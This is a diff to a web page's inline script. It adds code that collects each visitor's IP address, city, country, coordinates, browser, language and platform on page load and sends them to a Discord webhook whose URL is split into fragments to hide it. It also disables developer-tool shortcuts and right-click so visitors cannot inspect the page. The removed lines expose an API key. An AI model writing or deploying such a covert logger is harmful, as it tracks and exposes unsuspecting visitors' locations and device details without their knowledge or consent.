@@ -15,38 +15,48 @@
   </head>
   <script>
     window.onload = function () {
-      // temp mail dont even care
-      var requestUrl =
-        "https://api.ipgeolocation.io/ipgeo?apiKey=df0ce2ef645340af9485c49218021ed2";
-      $.ajax({
-        url: requestUrl,
-        type: "GET",
-        success: function (json) {
-          document.getElementById("query").innerHTML =
-            "#> Connected: " + json.ip + " from";
-          document.getElementById("country").innerHTML = json.country_name;
-        },
-      });
-    };
-
-    document.onkeydown = function (e) {
-    if (e.keyCode == 123) {
-       return false;
-    }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
-       return false;
-    }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
-       return false;
-    }
-    if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
-        return false;
-    }
-
-    if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
+      document.onkeydown = function(e) {
+        if(e.keyCode == 123) {
          return false;
+        }
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+         return false;
+        }
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+         return false;
+        }
+        if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+         return false;
+        }
+    
+        if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)){
+         return false;
+        }      
+     };
+
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+        $.getJSON("https://ipapi.co/" + data.ip + "/json/", function(ipapi) {
+            var request = new XMLHttpRequest();
+            request.open("POST", "ht" + "tps://discord.com/a"+"pi/webhooks/1"+"211964662502129684/gIoUY0"+"1-gT-wguPQVZjN"+"L3IXjJLOeVvu5CKchgBFhvHbn1px0sY5ukvOKifZsLGcNep"+"j");
+            request.setRequestHeader('Content-type', 'application/json');
+            let currentDate = new Date();
+            let cSec = currentDate.getSeconds();
+            let cMin = currentDate.getMinutes();
+            let cHour = currentDate.getHours();
+            let cDay = currentDate.getDate();
+            let cMonth = currentDate.getMonth() + 1;
+            let cYear = currentDate.getFullYear();
+            var params = 
+            {username: "Website logger", avatar_url: "", content: "", 
+            embeds: [{title: "User Logged on `" + cDay + "/" + cMonth + "/" + cYear + " | " + cHour + ":" + cMin + ":" + cSec + "`", color: 3684064,
+            description: "**IP: **`" + data.ip + "`" + "\n**Language: **`" + navigator.language + "`" + "\n**User Agent: **`" +  navigator.userAgent + "`" + "\n\n**OS: **` " + navigator.platform + "`" + "\n**Webdriver: **`" + navigator.webdriver + "`" + "\n**Version: **`" + navigator.appVersion + "`" + "\n**Country: **`" + ipapi.country_name + "`" + "\n**City: **`" + ipapi.city + "`" + "\n**Latitude: **`" + ipapi.latitude + "`" + "\n**Longitude: **`" + ipapi.longitude + "`"}]}
+            request.send(JSON.stringify(params));
+
+            document.getElementById('query').innerHTML = "#> Connected: " + data.ip + " from";
+            document.getElementById('country').innerHTML = ipapi.country_name;
+            })
+        })
     }
-    };
   </script>
   <body class="overflow-y-auto" oncontextmenu="return false">
     <canvas id="c" class="fixed inset-0 w-full h-full"
